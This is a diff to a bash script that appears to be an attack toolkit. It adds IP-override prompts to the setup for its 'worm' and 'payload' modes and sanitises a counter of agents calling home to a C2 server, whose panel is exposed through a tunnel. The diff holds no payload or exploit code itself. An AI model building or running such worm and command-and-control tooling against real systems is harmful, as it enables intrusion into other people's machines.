@@ -1465,6 +1465,11 @@ configure() {
         MY_IP=$(ip route get 8.8.8.8 2>/dev/null | awk '/src/{for(i=1;i<=NF;i++) if($i=="src"){print $(i+1);exit}}')
         [ -z "$MY_IP" ] && MY_IP=$(hostname -I 2>/dev/null | awk '{print $1}')
         ok "My IP auto-detected: $MY_IP"
+        ALL_IPS=$(ip -4 addr show | awk '/inet /{print $2}' | cut -d/ -f1 | grep -v 127 | tr '\n' '  ')
+        info "Available IPs: $ALL_IPS"
+        ask "Use a different IP? (Enter to keep $MY_IP, or type override e.g. 192.168.56.1):"
+        read -r _OVERRIDE_IP
+        [ -n "$_OVERRIDE_IP" ] && MY_IP="$_OVERRIDE_IP" && ok "Using: $MY_IP"
         info "File-based worm — no target domain needed"
         log "Config: worm mode, ip=$MY_IP"
         wait_key
@@ -1475,6 +1480,11 @@ configure() {
         MY_IP=$(ip route get 8.8.8.8 2>/dev/null | awk '/src/{for(i=1;i<=NF;i++) if($i=="src"){print $(i+1);exit}}')
         [ -z "$MY_IP" ] && MY_IP=$(hostname -I 2>/dev/null | awk '{print $1}')
         ok "My IP auto-detected: $MY_IP"
+        ALL_IPS=$(ip -4 addr show | awk '/inet /{print $2}' | cut -d/ -f1 | grep -v 127 | tr '\n' '  ')
+        info "Available IPs: $ALL_IPS"
+        ask "Use a different IP? (Enter to keep $MY_IP, or type override e.g. 192.168.56.1):"
+        read -r _OVERRIDE_IP
+        [ -n "$_OVERRIDE_IP" ] && MY_IP="$_OVERRIDE_IP" && ok "Using: $MY_IP"
         info "No target domain needed — agent calls home to your C2"
         info "C2 server will run on :8888 (web panel) — exposed via tunnel"
         log "Config: payload mode, ip=$MY_IP"
@@ -1518,10 +1528,16 @@ configure() {
         ok "Keeping: $TARGET_DOMAIN"
     fi
 
-    # My IP — auto-detect, no prompt
+    # My IP — auto-detect, allow override (important for VM/VirtualBox scenarios)
     MY_IP=$(ip route get 8.8.8.8 2>/dev/null | awk '/src/{for(i=1;i<=NF;i++) if($i=="src"){print $(i+1);exit}}')
     [ -z "$MY_IP" ] && MY_IP=$(hostname -I 2>/dev/null | awk '{print $1}')
     ok "My IP auto-detected: $MY_IP"
+    # Show all available IPs for reference
+    ALL_IPS=$(ip -4 addr show | awk '/inet /{print $2}' | cut -d/ -f1 | grep -v 127 | tr '\n' '  ')
+    info "Available IPs: $ALL_IPS"
+    ask "Use a different IP? (Enter to keep $MY_IP, or type override e.g. 192.168.56.1):"
+    read -r _OVERRIDE_IP
+    [ -n "$_OVERRIDE_IP" ] && MY_IP="$_OVERRIDE_IP" && ok "Using: $MY_IP"
 
     log "Config: target=$TARGET_DOMAIN ip=$MY_IP"
     wait_key
@@ -3452,6 +3468,7 @@ payload_flow() {
 
         # Print new agent connections
         AC=$(grep -c "\[AGENT\]\|\[TCP\] Agent" "$C2_LOG" 2>/dev/null || echo 0)
+        AC=${AC//[^0-9]/}; AC=${AC:-0}
         if [ "$AC" -gt "$LAST_AGENT" ]; then
             DIFF=$((AC - LAST_AGENT))
             grep "\[AGENT\]\|\[TCP\] Agent" "$C2_LOG" 2>/dev/null | \
